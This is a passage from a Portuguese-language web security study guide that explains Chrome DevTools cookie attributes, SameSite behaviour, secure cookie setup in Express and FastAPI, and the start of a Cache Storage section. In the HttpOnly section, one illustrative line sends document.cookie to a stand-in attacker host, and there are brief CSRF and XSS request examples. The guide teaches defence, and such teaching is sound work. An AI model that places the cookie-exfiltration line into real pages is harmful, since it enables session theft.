- **Como corrigir ou prevenir**: controlar o tempo de expiração da sessão no banco/cache do servidor **[REQUISITO]** e enviar `Set-Cookie: nome=; Max-Age=0; Path=/` no *logout* **[REQUISITO]**.

##### Size

- **Nome do parâmetro**: **Size** (Tamanho do cookie em bytes).
- **O que significa**: exibe o tamanho combinado (em bytes) do `Name` + `Value` daquele cookie.
- **Para que serve**: monitorar o peso que os cookies adicionam aos cabeçalhos de requisição HTTP e evitar exceder os limites impostos pelos navegadores e servidores web (a RFC 6265 exige suporte a pelo menos **4096 bytes / 4 KB** por cookie e pelo menos 50 cookies por domínio).
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Size**.
- **Exemplo prático**: `__Host-sid` com valor de 64 caracteres exibe `Size: 74`. Um cookie contendo um JWT enorme com dezenas de *claims* e permissões exibe `Size: 3850`.
- **Comportamento normal**: cookies enxutos entre `30` e `200` bytes.
- **O que seria considerado seguro**: manter cookies pequenos (identificadores opacos ou tokens compactos) para evitar degradação de desempenho e rejeição de cabeçalhos.
- **O que poderia indicar uma vulnerabilidade**:
  - **Cookie Bombing (DoS via Cookies)**: se um atacante conseguir fazer a aplicação ou um subdomínio gravar vários cookies grandes (ex.: 4 KB cada) para `.loja-ficticia.test`, toda requisição subsequente da vítima enviará um cabeçalho `Cookie:` gigantesco (ex.: 16 KB ou 32 KB). Servidores como Nginx, Apache ou CDNs rejeitarão a requisição com erro **`431 Request Header Fields Too Large`** ou **`400 Bad Request`**, tirando o site do ar para aquela vítima até que ela limpe os cookies manualmente!
  - Cookies próximos de 4096 bytes que falham silenciosamente ao serem gravados pelo navegador.
- **Como investigar o problema**: ordene a tabela pela coluna **Size** (do maior para o menor) e some o peso total dos cookies enviados para o domínio principal.
- **Como corrigir ou prevenir**: manter o estado volumoso no servidor (usando apenas um ID curto no cookie) **[BOA PRÁTICA]**, usar o prefixo `__Host-` para impedir que subdomínios plantem *Cookie Bombs* **[RECOMENDAÇÃO]** e validar o tamanho dos dados antes de emitir `Set-Cookie` **[BOA PRÁTICA]**.

##### HttpOnly

- **Nome do parâmetro**: **HttpOnly** (Flag de restrição de acesso exclusivo ao protocolo HTTP).
- **O que significa**: atributo booleano do cabeçalho `Set-Cookie` que instrui o navegador a **proibir o acesso ao cookie por meio de APIs do lado do cliente (JavaScript)**, especificamente ocultando-o da propriedade `document.cookie` (e da *Cookie Store API* `window.cookieStore`). O cookie continua sendo armazenado normalmente pelo navegador e enviado automaticamente nos cabeçalhos HTTP de cada requisição compatível.
- **Para que serve**: mitigar drasticamente o impacto de vulnerabilidades de **XSS (*Cross-Site Scripting*)** no roubo direto de sessão (*Session Hijacking*): mesmo que um invasor consiga injetar e executar JavaScript arbitrário na página da vítima, o script malicioso **não conseguirá ler nem exfiltrar** o valor do cookie de sessão marcado com `HttpOnly`.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **HttpOnly** (exibe um ícone de marca de seleção `✓` quando ativo, ou fica em branco quando ausente).
- **Exemplo prático**:
  - Na tabela do DevTools: `__Host-session_id` exibe `✓` na coluna **HttpOnly**. Ao abrir a aba [Console](./02c-devtools-console.md#s2-3) e digitar `document.cookie`, o cookie `__Host-session_id` **não aparece** na string retornada.
- **Comportamento normal**: todos os cookies de sessão, autenticação e *Refresh Tokens* têm `✓` na coluna **HttpOnly**; apenas cookies que o próprio front-end precisa ler legitimamente via JavaScript (como um cookie de preferência de idioma ou um cookie de token anti-CSRF no padrão *Double Submit Cookie*) ficam sem `HttpOnly`.
- **O que seria considerado seguro**:
  - **[REQUISITO]** Todo cookie que armazena identificador de sessão, credencial ou token de autenticação (`access_token`, `refresh_token`, `sid`) **deve obrigatoriamente** possuir o atributo `HttpOnly`.
- **O que poderia indicar uma vulnerabilidade**:
  - **Cookie de sessão com a coluna `HttpOnly` em branco**: é um dos achados mais cobrados em provas acadêmicas e auditorias reais (CWE-1004 — *Sensitive Cookie Without 'HttpOnly' Flag*). Significa que qualquer XSS na aplicação permitirá o sequestro imediato da conta da vítima com `fetch('https://atacante.test/?c=' + encodeURIComponent(document.cookie))`.
- **Como investigar o problema**: abra **Application → Cookies**, localize o cookie que autentica o usuário e verifique se há um `✓` na coluna **HttpOnly**. Confirme abrindo a aba [Console](./02c-devtools-console.md#s2-3) e executando `document.cookie`: se o token de sessão aparecer no retorno do Console, ele está vulnerável.
- **Como corrigir ou prevenir**: adicionar a diretiva `; HttpOnly` na emissão do cabeçalho `Set-Cookie` no servidor web ou framework de back-end **[REQUISITO]**.

> [!WARNING]
> **Pegadinha clássica de prova**: o atributo `HttpOnly` **impede que um script XSS leia o valor do cookie**, mas **NÃO impede** que um script XSS rodando na própria página dispare requisições autenticadas (`fetch('/api/transferir', { method: 'POST', credentials: 'include', ... })`) usando a sessão da vítima enquanto a aba estiver aberta! Portanto, `HttpOnly` impede a exfiltração do cookie para uso externo, mas não substitui a necessidade de corrigir o XSS.

##### Secure

- **Nome do parâmetro**: **Secure** (Flag de transmissão exclusiva sobre canais criptografados HTTPS/TLS).
- **O que significa**: atributo booleano do cabeçalho `Set-Cookie` que determina que o navegador **só pode transmitir aquele cookie na rede se a requisição utilizar um esquema criptografado seguro (`https://` ou `wss://`)**, jamais enviando-o em requisições em texto claro (`http://` ou `ws://`), exceto para `localhost` em ambiente local de desenvolvimento. Além disso, navegadores modernos impedem que páginas carregadas via `http://` inseguro definam ou sobrescrevam cookies com a flag `Secure`.
- **Para que serve**: proteger o cookie contra interceptação em trânsito (*sniffing* em redes Wi-Fi públicas, ataques *Man-in-the-Middle* ou *SSL Stripping*) quando o usuário ou um sub-recurso tenta fazer uma requisição para `http://` naquele mesmo domínio.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Secure** (exibe `✓` quando presente, ou fica em branco quando ausente).
- **Exemplo prático**: se `loja-ficticia.test` define `Set-Cookie: sid=abc; Secure; HttpOnly`, e mais tarde a vítima clica em um link legado `http://loja-ficticia.test/promocao` (sem S), o navegador **não enviará** o cookie `sid` na requisição HTTP em texto claro, salvando a sessão de vazar na rede antes do redirecionamento 301 para HTTPS.
- **Comportamento normal**: em qualquer aplicação servida sob HTTPS, praticamente 100% dos cookies exibem `✓` na coluna **Secure**. Além disso, cookies com `SameSite=None` ou com os prefixos `__Secure-` e `__Host-` **exigem obrigatoriamente** a flag `Secure` (caso contrário, são rejeitados pelo navegador).
- **O que seria considerado seguro**:
  - **[REQUISITO]** Habilitar o atributo `Secure` em todos os cookies de sessão e em qualquer cookie transmitido em aplicações em produção (combinado com HSTS — *HTTP Strict Transport Security* — veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **O que poderia indicar uma vulnerabilidade**:
  - **Coluna `Secure` em branco em cookies de sessão (CWE-614 — *Sensitive Cookie in HTTPS Session Without 'Secure' Attribute*)**: mesmo que o site inteiro use HTTPS, se o cookie de sessão não tiver `Secure`, um atacante na mesma rede local pode forçar o navegador da vítima a fazer uma única requisição `http://loja-ficticia.test/` (por exemplo, injetando uma tag `<img>` em outro site HTTP ou via DNS) apenas para capturar o cookie de sessão que o navegador enviará em texto claro!
- **Como investigar o problema**: na tabela **Application → Cookies**, verifique se todos os cookies possuem `✓` na coluna **Secure**.
- **Como corrigir ou prevenir**: adicionar `; Secure` na geração de todos os cookies em produção **[REQUISITO]** e implantar o cabeçalho `Strict-Transport-Security` (HSTS) **[RECOMENDAÇÃO]**.

##### SameSite

- **Nome do parâmetro**: **SameSite** (Política de envio do cookie em requisições entre sites — *Cross-Site*).
- **O que significa**: atributo introduzido na RFC 6265bis que controla se e quando o navegador deve enviar o cookie em requisições originadas de um **site diferente** (*cross-site*, onde o conceito de "site" baseia-se no `esquema + eTLD+1`, ou seja, o domínio registrável como `loja-ficticia.test`). Aceita três valores: **`Strict`**, **`Lax`** ou **`None`**.
- **Para que serve**: atuar como uma poderosa **defesa em profundidade nativa do navegador contra ataques de CSRF (*Cross-Site Request Forgery*)** e vazamentos de informação entre sites (*XS-Leaks* — *Cross-Site Leaks*), além de regular o funcionamento de cookies de terceiros.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **SameSite**.
- **Exemplo prático**:
  - `SameSite: Strict` (bloqueia envio em qualquer fluxo vindo de outro site, inclusive cliques em links externos).
  - `SameSite: Lax` (bloqueia envio em sub-recursos e formulários `POST` cross-site, mas envia quando o usuário clica em um link `<a href="...">` de navegação principal `GET`).
  - `SameSite: None` (envia em contextos cross-site, como dentro de `<iframe>` ou `fetch` entre domínios diferentes, **exigindo obrigatoriamente `Secure`**).
- **Comportamento normal**:
  - **Comportamento padrão (*Lax by default*)**: a partir do Chrome 80+, se o servidor **omitir** o atributo `SameSite` ao enviar `Set-Cookie`, o Chrome aplica automaticamente o comportamento de **`SameSite=Lax`** por padrão (na tabela do DevTools, a coluna **SameSite** pode aparecer vazia para indicar que não foi declarado explicitamente no cabeçalho, mas o navegador o trata internamente como `Lax`).
- **O que seria considerado seguro**:
  - **[RECOMENDAÇÃO]** Declarar explicitamente `SameSite=Lax` (para a maioria das aplicações web onde o usuário precisa continuar logado ao clicar em um link vindo de um e-mail ou buscador) ou `SameSite=Strict` (para aplicações de altíssimo risco, como bancos e painéis administrativos internos).
- **O que poderia indicar uma vulnerabilidade**:
  - `SameSite=None` usado no cookie de sessão principal sem necessidade de execução em *iframe* de terceiros e sem proteção anti-CSRF robusta, expondo a aplicação integralmente a ataques de CSRF e *XS-Leaks*.
  - `SameSite=None` configurado **sem** a flag `Secure`: o navegador bloqueará o cookie e exibirá um alerta na tabela e na aba **Issues**.
- **Como investigar o problema**: examine a coluna **SameSite** em **Application → Cookies**. Se estiver em branco, o desenvolvedor esqueceu de declará-lo explicitamente; se estiver `None`, investigue se a aplicação realmente precisa funcionar embutida em outro domínio e se possui tokens anti-CSRF.
- **Como corrigir ou prevenir**: declarar explicitamente `SameSite=Lax` ou `SameSite=Strict` em todos os cookies de primeira parte **[RECOMENDAÇÃO]** e combinar com tokens anti-CSRF para operações que alteram estado **[REQUISITO]**.

##### Priority

- **Nome do parâmetro**: **Priority** (Prioridade de retenção/evicção do cookie no armazenamento local).
- **O que significa**: atributo de extensão implementado pelo Chromium (`Priority=Low`, `Medium` ou `High` — sendo `Medium` o valor padrão quando omitido) que define a ordem em que os cookies daquele domínio serão descartados caso o limite máximo de cookies por domínio (tipicamente ~180 cookies no Chrome) seja ultrapassado.
- **Para que serve**: impedir que cookies menos importantes (como dezenas de cookies de *analytics* ou rastreamento de campanhas com `Priority=Low`) expulsem (*evict*) o cookie crítico de autenticação do usuário (`Priority=High`) quando a cota de quantidade de cookies do domínio enche.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Priority**.
- **Exemplo prático**: o cookie `__Host-session` configurado com `Set-Cookie: __Host-session=xyz; Secure; HttpOnly; SameSite=Lax; Priority=High` exibe `High` na coluna **Priority**, enquanto cookies de métricas exibem `Low` ou `Medium`.
- **Comportamento normal**: exibe `Medium` por padrão para todos os cookies que não declaram `Priority` explicitamente.
- **O que seria considerado seguro**:
  - **[BOA PRÁTICA]** Definir `Priority=High` em cookies essenciais de sessão e de proteção anti-CSRF para evitar que um ataque de *Cookie Jar Overflow* (preenchimento do limite de cookies por um subdomínio ou script) derrube o cookie de segurança.
- **O que poderia indicar uma vulnerabilidade**: cookies críticos de segurança com prioridade igual ou inferior a cookies gerados dinamicamente por parâmetros de URL, facilitando a expulsão forçada do cookie de proteção CSRF.
- **Como investigar o problema**: verifique a coluna **Priority** na tabela de Cookies e conte quantos cookies o domínio já armazena.
- **Como corrigir ou prevenir**: usar o prefixo `__Host-` combinado com `Priority=High` nos cookies de sessão e CSRF **[BOA PRÁTICA]**.

##### Partitioned (e Partition Key — CHIPS)

- **Nome do parâmetro**: **Partitioned** e **Partition Key** (Atributo `Partitioned` do padrão **CHIPS — *Cookies Having Independent Partitioned State***).
- **O que significa**: o mecanismo **CHIPS** permite que um serviço de terceiros legítimo (por exemplo, um widget de chat de suporte, um mapa incorporado ou um player de vídeo em `https://widget.terceiro.test`) marque seu cookie `SameSite=None; Secure; Partitioned`. Quando `Partitioned` está ativo, o cookie é armazenado em um **"pote" (*cookie jar*) isolado e particionado** cuja chave (**Partition Key**) é composta pelo **site de nível superior (*top-level site*)** onde o iframe está embutido.
- **Para que serve**: permitir que componentes embutidos cross-site mantenham estado ou sessão **apenas dentro daquele site específico**, impedindo que o terceiro use o mesmo cookie para rastrear o usuário quando ele visitar outro site diferente.
  - Por exemplo: se `widget.terceiro.test` define um cookie `Partitioned` enquanto está embutido em `https://loja-a.test`, a **Partition Key** será `https://loja-a.test`. Quando o usuário visitar `https://loja-b.test` (que também embute `widget.terceiro.test`), o navegador **não enviará** o cookie da `loja-a.test`; será criado um cookie totalmente separado com `Partition Key: https://loja-b.test`.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → colunas **Partition Key Site** (ou **Partition Key**) e **Cross Site** / **Partitioned** **[Varia por versão]**.
- **Exemplo prático**:

```http
Set-Cookie: __Host-chat_sess=98a7b6; Secure; HttpOnly; Path=/; SameSite=None; Partitioned
```

  Na tabela do DevTools, esse cookie exibirá `Partition Key Site: https://loja-ficticia.test`.
- **Comportamento normal**: cookies de primeira parte (*first-party*) não precisam de `Partitioned`; cookies de terceiros que funcionam em `<iframe>` utilizam `SameSite=None; Secure; Partitioned`.
- **O que seria considerado seguro**:
  - **[RECOMENDAÇÃO]** Sempre que um serviço precisar definir cookies com `SameSite=None` para funcionar embutido em sites de clientes via `<iframe>`, adicionar o atributo `Partitioned` (e preferencialmente o prefixo `__Host-` ou `Secure; Path=/`) para isolar a sessão por site hospedeiro.
- **O que poderia indicar uma vulnerabilidade**:
  - Cookies `SameSite=None` **sem** `Partitioned` em widgets embutidos: qualquer terceiro site malicioso na internet (`https://atacante.test`) que embutir o mesmo widget receberá os mesmos cookies do usuário, ampliando a superfície de ataques cross-site e *XS-Leaks*.
  - Tentar usar `Partitioned` sem a flag `Secure` (o navegador rejeitará o cookie).
- **Como investigar o problema**: inspecione as colunas **SameSite** e **Partition Key Site** na tabela de Cookies para origens de iframes de terceiros, e verifique a aba **Issues** por alertas sobre cookies de terceiros ou configuração inválida de `Partitioned`.
- **Como corrigir ou prevenir**: adicionar `; Secure; Path=/; SameSite=None; Partitioned` nos cookies destinados a contextos embutidos cross-site **[RECOMENDAÇÃO]**.

##### SameParty

- **Nome do parâmetro**: **SameParty** (**[Obsoleto]** — Atributo experimental dos antigos *First-Party Sets*).
- **O que significa**: **[Obsoleto]** Foi um atributo experimental proposto inicialmente pelo Google Chrome para permitir que domínios diferentes pertencentes à mesma empresa (declarados em um conjunto chamado *First-Party Sets*) compartilhassem cookies com `SameSite=Lax` ou `None; SameParty`. A proposta dos *First-Party Sets* evoluiu posteriormente para **Related Website Sets (RWS)** usando a API `document.requestStorageAccess()` (*Storage Access API*), e o atributo de cookie `SameParty` foi **descontinuado e removido**.
- **Para que serve**: contexto histórico; em versões antigas do DevTools aparecia como uma coluna na tabela de Cookies, e em versões mais recentes do Chrome o atributo é ignorado ou gera aviso de depreciação.
- **Onde encontrar no DevTools**: **[Obsoleto]** Aparecia na tabela **Application → Cookies** em versões anteriores do Chrome; hoje não deve mais ser utilizado.
- **Exemplo prático**: `Set-Cookie: sso=123; Secure; SameSite=None; SameParty` (sintaxe obsoleta).
- **Comportamento normal**: não deve estar presente em aplicações modernas.
- **O que seria considerado seguro**: utilizar mecanismos padronizados atuais, como **CHIPS (`Partitioned`)**, **Storage Access API (`document.requestStorageAccess`)** ou fluxos padrão **OAuth 2.0 / OpenID Connect (OIDC)** / **FedCM (*Federated Credential Management API*)** para autenticação entre domínios da mesma organização.
- **O que poderia indicar uma vulnerabilidade**: depender do atributo obsoleto `SameParty` achando que ele restringe o envio de um cookie `SameSite=None` apenas aos domínios da própria empresa (como o navegador ignora `SameParty`, o cookie `SameSite=None` acaba sendo enviado para **qualquer** site na internet!).
- **Como investigar o problema**: procure por `SameParty` nos cabeçalhos `Set-Cookie` na aba [Network](./02a-devtools-network.md#s2-1) ou alertas na aba **Issues**.
- **Como corrigir ou prevenir**: remover `SameParty` e migrar para `Partitioned` (CHIPS) ou fluxos OIDC/FedCM **[RECOMENDAÇÃO]**.

---

<a id="s2-2-6"></a>
#### 2.2.6 Aprofundamento em Segurança de Cookies

Por ser um dos temas mais recorrentes tanto em provas acadêmicas de Segurança Web quanto em auditorias práticas de aplicações reais, esta subseção consolida o funcionamento conjunto da tríade de proteção de cookies (**`HttpOnly`**, **`Secure`** e **`SameSite`**), detalha os cenários exatos de envio de `Strict`, `Lax` e `None`, mostra como diagnosticar cookies vulneráveis na tabela do DevTools e apresenta a receita completa de configuração segura.

##### Resumo conceitual da tríade `HttpOnly`, `Secure` e `SameSite`

1. **O que é `HttpOnly`?**
   É a barreira entre o cookie e o **motor JavaScript do navegador**. Protege a **confidencialidade do cookie no cliente contra leitura por XSS** (`document.cookie`). Não afeta como o cookie viaja na rede; afeta apenas quem pode lê-lo dentro do navegador.
2. **O que é `Secure`?**
   É a barreira entre o cookie e **conexões de rede não criptografadas**. Protege a **confidencialidade e integridade do cookie em trânsito contra interceptação de rede (MitM / Sniffing)**, proibindo seu envio em requisições `http://` em texto claro.
3. **O que é `SameSite`?**
   É a barreira entre o cookie e **requisições disparadas por outros sites (*cross-site*)**. Protege a aplicação contra **ações não intencionais forçadas por sites externos (CSRF)**, controlando quando o navegador anexa automaticamente o cookie em requisições iniciadas fora do site de origem.

##### Diferença detalhada entre `SameSite=Strict`, `SameSite=Lax` e `SameSite=None`

Para compreender `SameSite`, imagine que a usuária **Ana** já está autenticada no banco ou loja `https://loja-ficticia.test` (que definiu um cookie de sessão) e, em outra aba, ela visita um site externo `https://portal-noticias.test` ou uma página controlada por um atacante `https://armadilha.test`. O que acontece quando `armadilha.test` tenta fazer o navegador de Ana requisitar recursos de `https://loja-ficticia.test`?

- **`SameSite=Strict` (Máximo isolamento)**:
  - O cookie **NUNCA** é enviado em nenhuma requisição iniciada por outro site (*cross-site*), nem mesmo quando Ana clica voluntariamente em um link `<a href="https://loja-ficticia.test/meus-pedidos">` dentro de um e-mail ou site externo.
  - **Consequência de UX (*User Experience*)**: se o cookie de login for `Strict`, ao clicar em um link externo para `loja-ficticia.test`, Ana parecerá deslogada na primeira página aberta (precisando clicar em algo dentro do site ou fazer login novamente). Por isso, `Strict` é excelente para operações críticas ou bancos, ou quando a aplicação usa dois cookies separados: um cookie `Lax` apenas para mostrar "Olá, Ana" (leitura) e um cookie `Strict` exigido para transferir dinheiro ou mudar senha (escrita).
- **`SameSite=Lax` (Equilíbrio entre segurança e usabilidade — Padrão do navegador)**:
  - O cookie **NÃO** é enviado em sub-recursos cross-site invisíveis (como `<img>`, `<iframe>`, `<script>`, `fetch()` ou `XMLHttpRequest` disparados por `armadilha.test`) e **NÃO** é enviado em submissões de formulários cross-site via **`POST`** (`<form method="POST">`).
  - Porém, o cookie **É ENVIADO** quando ocorre uma **navegação de nível superior (*top-level navigation*)** que altera a URL da barra de endereços usando um **método HTTP seguro (`GET`, `HEAD`)** — por exemplo, quando Ana clica em um link `<a href="https://loja-ficticia.test/perfil">` ou quando há um `<form method="GET">` de navegação principal.
  - **Ponto crítico de segurança**: se o desenvolvedor violar a semântica HTTP (RFC 9110) e programar uma ação que altera estado usando o método **`GET`** (ex.: `GET /conta/excluir?confirmar=sim`), **`SameSite=Lax` NÃO protegerá contra CSRF** caso o atacante redirecione a janela principal da vítima (`window.location = "https://loja-ficticia.test/conta/excluir?confirmar=sim"`)!
- **`SameSite=None` (Sem restrição cross-site — exige `Secure`)**:
  - O cookie **É ENVIADO** em todas as requisições, sejam elas do mesmo site (*same-site*) ou de outros sites (*cross-site*), incluindo chamadas `fetch` com `credentials: 'include'`, formulários `POST` e dentro de `<iframe>`.
  - Só deve ser usado para recursos que intencionalmente funcionam dentro de outros domínios (e preferencialmente combinado com `Partitioned`).

> [!NOTE]
> **[Varia por versão]** **Exceção temporária *Lax+POST* (2 minutos)**: quando um cookie é definido **sem** declarar o atributo `SameSite` explicitamente (caindo no *Lax by default* do navegador), algumas versões do Chrome aplicaram historicamente uma janela de tolerância de **2 minutos** após a criação do cookie na qual requisições `POST` de navegação top-level ainda enviavam o cookie (para não quebrar fluxos antigos de login SAML/OpenID). Declarar **`SameSite=Lax` explicitamente** no cabeçalho `Set-Cookie` elimina essa ambiguidade e aplica a regra estrita do `Lax` imediatamente!

**Tabela comparativa de envio do Cookie em requisições *Cross-Site* (`https://externo.test` → `https://loja-ficticia.test`):**

| Cenário / Como a requisição Cross-Site foi disparada | Método HTTP | Tipo de Navegação | `SameSite=Strict` | `SameSite=Lax` | `SameSite=None; Secure` |
|---|---|---|---|---|---|
| Requisição interna dentro do próprio site (`loja-ficticia.test` → `loja-ficticia.test`) | Qualquer | *Same-Site* | **Envia** | **Envia** | **Envia** |
| Clique do usuário em link `<a href="...">` ou `window.location` | `GET` | *Top-level navigation* | **Não envia** | **Envia** | **Envia** |
| Redirecionamento `302` / `<meta http-equiv="refresh">` na janela principal | `GET` | *Top-level navigation* | **Não envia** | **Envia** | **Envia** |
| Formulário `<form method="GET" action="...">` | `GET` | *Top-level navigation* | **Não envia** | **Envia** | **Envia** |
| Formulário `<form method="POST" action="...">` (Ataque CSRF clássico!) | `POST` | *Top-level navigation* | **Não envia** | **Não envia** | **Envia** |
| Requisição assíncrona via JavaScript (`fetch()` / `XHR` com `credentials: 'include'`) | `GET` / `POST` | Sub-recurso (Background) | **Não envia** | **Não envia** | **Envia** |
| Carregamento de página dentro de `<iframe src="...">` | `GET` | Sub-recurso (Frame) | **Não envia** | **Não envia** | **Envia** |
| Carregamento de imagem `<img src="...">` ou `<script src="...">` | `GET` | Sub-recurso | **Não envia** | **Não envia** | **Envia** |

##### O que acontece quando esses atributos não são configurados?

| Atributo Ausente / Mal Configurado | Consequência Direta no Navegador | Vulnerabilidade / Ataque Viabilizado |
|---|---|---|
| Sem **`HttpOnly`** | O cookie fica legível via `document.cookie` para qualquer script na origem. | **Session Hijacking via XSS**: roubo instantâneo do token de sessão por qualquer falha de XSS ou pacote NPM malicioso. |
| Sem **`Secure`** | O navegador aceita enviar o cookie em conexões `http://` sem criptografia. | **Interceptação em Rede (MitM)**: captura do cookie em texto claro caso o navegador faça qualquer requisição HTTP na rede. |
| Sem **`SameSite`** (ou com `SameSite=None` indevido) | O cookie pode ser anexado automaticamente em requisições disparadas por sites maliciosos de terceiros. | **CSRF (*Cross-Site Request Forgery*)** e **XS-Leaks**: execução de ações autenticadas em nome da vítima sem o conhecimento dela. |
| Com **`Domain=.site.test`** amplo e sem **`__Host-`** | O cookie é enviado para todos os subdomínios e pode ser sobrescrito por subdomínios. | **Session Fixation / Cookie Tossing** e vazamento da sessão para subdomínios legados ou comprometidos. |
| Com **`Expires` / `Max-Age`** longo demais | O cookie permanece gravado em disco por meses/anos. | **Persistência Indevida**: sequestro de sessão em computadores compartilhados ou por malwares locais. |

##### Como identificar cookies vulneráveis na tabela do DevTools

Durante uma prova prática ou auditoria de segurança, abra **Application → Storage → Cookies → `<origem>`** e compare cada linha com o exemplo visual abaixo:

```text
Name              | Value                    | Domain              | Path | Expires/Max-Age | HttpOnly | Secure | SameSite
------------------+--------------------------+---------------------+------+-----------------+----------+--------+---------
PHPSESSID         | 8a9f7b6c5d4e...          | .loja-ficticia.test | /    | 2027-10-30...   |          |        | None      <-- [CRÍTICO / INSEGURO]
perfil_dados      | {"cpf":"123.456.789-00"} | loja-ficticia.test  | /    | Session         |          | ✓      | Lax       <-- [PII EXPOSTA]
__Host-sessao_id  | 9f8e7d6c5b4a3f2e1d0c...  | loja-ficticia.test  | /    | Session         | ✓        | ✓      | Lax       <-- [SEGURO]
```

Sinais imediatos de vulnerabilidade na tabela acima:
1. A linha `PHPSESSID` é um desastre completo de segurança: expõe a tecnologia (`PHPSESSID`), tem escopo aberto para todos os subdomínios (`.loja-ficticia.test`), dura 1 ano inteiro, **não tem `✓` em `HttpOnly`**, **não tem `✓` em `Secure`** e usa `SameSite=None` (inclusive o navegador moderno bloqueará `SameSite=None` sem `Secure`, marcando a linha em amarelo/vermelho ao ativar **Only show cookies with an issue**).
2. A linha `perfil_dados` grava um dado pessoal sensível (CPF) diretamente no valor do cookie e é legível por JavaScript.
3. A linha `__Host-sessao_id` representa o padrão ouro de segurança: usa prefixo `__Host-`, valor opaco de alta entropia, *host-only* (`loja-ficticia.test` sem ponto), `Path=/`, duração `Session`, **`HttpOnly` marcado (`✓`)**, **`Secure` marcado (`✓`)** e **`SameSite=Lax`** (ou `Strict`).

##### Receita completa de como configurar um cookie seguro

**[REQUISITO]** Para configurar um cookie de sessão seguro em produção, emita o cabeçalho `Set-Cookie` combinando o prefixo `__Host-` (ou `__Secure-`), um identificador opaco gerado por CSPRNG e as flags `Secure`, `HttpOnly`, `Path=/` e `SameSite=Lax` (ou `Strict`):

**1. Cabeçalho HTTP Bruto (Padrão RFC 6265bis):**

```http
Set-Cookie: __Host-session_id=4f8a9b2c7d1e6f3a0b5c8d2e9f4a1b7c3d6e0f9a2b5c8d1e4f7a0b3c6d9e2f5a; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600; Priority=High
```

**2. Em Node.js / Express:**

```javascript
const crypto = require('node:crypto');

app.post('/api/login', (req, res) => {
  // Gera ID de sessão criptograficamente seguro (32 bytes = 256 bits de entropia)
  const sessionId = crypto.randomBytes(32).toString('hex');

  // Salva a sessão no armazenamento do servidor (ex.: Redis) associada ao usuário
  salvarSessaoNoServidor(sessionId, { userId: req.user.id, createdAt: Date.now() });

  // Define o cookie com todos os atributos de proteção
  res.cookie('__Host-session_id', sessionId, {
    path: '/',           // Obrigatório para o prefixo __Host- (e sem atributo 'domain')
    httpOnly: true,      // [REQUISITO] Invisível ao JavaScript (document.cookie)
    secure: true,        // [REQUISITO] Enviado apenas via HTTPS
    sameSite: 'lax',     // [RECOMENDAÇÃO] 'lax' ou 'strict' contra CSRF
    maxAge: 3600 * 1000, // Expiração em milissegundos no Express (1 hora)
    priority: 'high'     // [BOA PRÁTICA] Evita evicção por Cookie Jar Overflow
  });

  res.status(200).json({ status: 'autenticado' });
});
```

**3. Em Python (Flask / FastAPI):**

```python
import secrets
from fastapi import FastAPI, Response

app = FastAPI()

@app.post("/api/login")
def login(response: Response):
    session_id = secrets.token_hex(32)  # 256 bits de entropia via CSPRNG
    response.set_cookie(
        key="__Host-session_id",
        value=session_id,
        path="/",
        httponly=True,
        secure=True,
        samesite="lax",
        max_age=3600,
    )
    return {"status": "autenticado"}
```


---

<a id="s2-2-7"></a>
#### 2.2.7 Service Workers e Cache Storage

Embora o navegador já possua o **HTTP Cache** tradicional (Disk Cache e Memory Cache, controlados automaticamente pelo navegador a partir de cabeçalhos como `Cache-Control` e `ETag`, veja [Cache do Navegador](./01a-fundamentos-web-parte1.md#s1)), as aplicações web modernas contam com uma segunda camada de cache totalmente controlada via código JavaScript: a **Cache API (`window.caches` / `self.caches`)**, inspecionável no DevTools sob o item **Cache storage**.

##### Como Service Workers e Cache Storage funcionam em conjunto

O **Service Worker** e o **Cache Storage** formam uma dupla arquitetural complementar:
1. O **Service Worker** é o **agente interceptador** (*compute/proxy*): ele escuta o evento `fetch` disparado sempre que a página requisita um documento, script, folha de estilo, imagem ou endpoint de API dentro do seu `scope`.
2. O **Cache Storage** é o **repositório persistente de pares `Request` → `Response`** (*storage*): diferentemente do `localStorage` (que guarda strings) ou do `IndexedDB` (que guarda objetos JS), o *Cache Storage* guarda objetos HTTP **`Response` completos** (incluindo código de status, cabeçalhos HTTP e fluxo de corpo binário ou textual), indexados pelo objeto **`Request`** (URL, método e cabeçalhos variados).

Quando a página faz `fetch('/api/catalogo')` ou carrega `<script src="/app.js">`, o *Service Worker* intercepta a chamada e pode aplicar estratégias clássicas de cache programático:
- **Cache First (Cache Falling Back to Network)**: verifica primeiro se a requisição existe em `caches.match(event.request)`; se existir, devolve a resposta do *Cache Storage* instantaneamente sem tocar na rede. Ideal para arquivos estáticos versionados por hash (`app.8f9a2b.js`).
- **Network First (Network Falling Back to Cache)**: tenta buscar a resposta atualizada na rede e salva uma cópia (`response.clone()`) no *Cache Storage* para uso caso o usuário fique offline.
- **Stale-While-Revalidate**: devolve imediatamente a resposta que está no *Cache Storage* (para velocidade máxima) e, em paralelo, dispara a requisição na rede para atualizar o *Cache Storage* em segundo plano.
- **Network Only**: nunca armazena nem lê do *Cache Storage* (obrigatório para endpoints sensíveis de autenticação, pagamentos e dados pessoais críticos).

##### Cache Storage

- **Nome do parâmetro**: **Cache Storage** (Inspetor da *Cache API* `window.caches` no DevTools).
- **O que significa**: seção do grupo **Storage** que lista todos os caches nomeados criados na origem atual via `caches.open('nome-do-cache')` e exibe, para cada cache, a tabela completa de recursos HTTP armazenados.
- **Para que serve**: inspecionar todas as respostas HTTP cacheadas programaticamente por *Service Workers* (ou scripts da página), visualizando as colunas **Name (Path/URL)**, **Response-Type** (`basic`, `cors`, `default`, `opaque`), **Content-Type**, **Content-Length**, **Time Cached** (horário em que foi salvo), além de permitir examinar os **Headers** e o **Preview / Response** completo de cada entrada na gaveta inferior, filtrar por caminho (`Filter by Path`), atualizar (`Refresh`) ou excluir entradas/caches inteiros (`Delete`).
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Storage** → expandir **Cache storage** → clicar no nome do cache (ex.: `loja-static-v1`).
- **Exemplo prático**:

```text
Cache storage > loja-static-v1
Name                         | Response-Type | Content-Type             | Content-Length | Time Cached
